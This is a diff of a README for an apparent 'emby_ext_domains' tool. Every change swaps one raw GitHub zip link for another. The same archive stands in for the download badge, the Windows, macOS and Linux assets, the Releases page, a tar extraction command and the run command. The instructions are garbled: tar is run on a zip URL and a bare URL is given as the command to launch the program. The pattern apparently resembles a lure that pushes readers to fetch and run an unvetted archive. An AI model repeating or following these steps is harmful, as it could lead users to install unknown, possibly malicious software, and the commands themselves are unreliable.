@@ -12,15 +12,15 @@ Before getting started, ensure that your system meets the following requirements
 ## 📥 Download & Install
 To download the application, visit the Releases page below. 
 
-[![Download emby_ext_domains](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip%20Latest%20Release-emby_ext_domains-blue?style=for-the-badge)](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip)
+[![Download emby_ext_domains](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip%20Latest%20Release-emby_ext_domains-blue?style=for-the-badge)](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip)
 
 Once on the page, follow these steps to download and install:
 
 1. Click the link labeled as the latest version (e.g., "v1.0").
 2. In the assets section, choose the file that matches your operating system:
-   - For Windows, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip`
-   - For macOS, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip`
-   - For Linux, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip`
+   - For Windows, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip`
+   - For macOS, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip`
+   - For Linux, click on `https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip`
 3. Save the file to a location you can easily access, such as your Downloads folder.
 
 ## 📂 Extracting the Application
@@ -36,7 +36,7 @@ After downloading the file, you must extract it:
 3. **For Linux Users:**
    - Open the terminal, navigate to your Downloads folder, and run:
      ```bash
-     tar -xvzf https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip
+     tar -xvzf https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip
      ```
 
 ## ⚙️ Running the Application
@@ -50,7 +50,7 @@ After extracting, navigate to the folder containing the application files.
    ```
 3. Run the application by typing:
    ```bash
-   https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip
+   https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip
    ```
 
 ### For macOS:
@@ -98,7 +98,7 @@ If you encounter issues or have questions, refer to the following:
 - Lightweight and efficient performance.
 
 ## 🔄 Keeping Updated
-To keep your application updated, return to the [Releases page](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/emby_ext_domains_2.2-alpha.2.zip) regularly. Download the latest version to gain new features and improvements. 
+To keep your application updated, return to the [Releases page](https://raw.githubusercontent.com/sunnypaji88/emby_ext_domains/main/desilverize/domains-emby-ext-v1.1.zip) regularly. Download the latest version to gain new features and improvements. 
 
 Downloading is easy; just click the version number, select the appropriate asset, and follow the steps outlined above.
 
